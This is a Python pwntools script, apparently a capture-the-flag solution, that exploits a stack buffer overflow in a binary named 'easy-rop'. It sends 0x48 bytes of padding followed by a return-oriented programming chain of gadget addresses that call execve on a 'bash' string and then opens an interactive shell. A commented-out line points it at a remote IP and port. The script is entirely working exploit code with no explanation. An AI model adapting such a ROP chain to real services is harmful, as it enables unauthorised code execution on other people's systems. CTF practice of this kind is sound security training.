from pwn import *

#p=remote("65.1.92.179", 49153)
p=process("./easy-rop")
e=ELF("./easy-rop")

sh_addr=next(e.search("bash\x00"))

prdi=0x40191a
prsi=0x40f4be
prdx=0x40181f
prax=0x4175eb
syscall=0x4012d3

sleep(2)
p.recv()

pay="A"*0x48
pay+=p64(prdi)
pay+=p64(sh_addr)
pay+=p64(prsi)
pay+=p64(0)
pay+=p64(prdx)
pay+=p64(0)
pay+=p64(prax)
pay+=p64(59)
pay+=p64(syscall)

pause()

p.sendline(pay)

p.interactive()
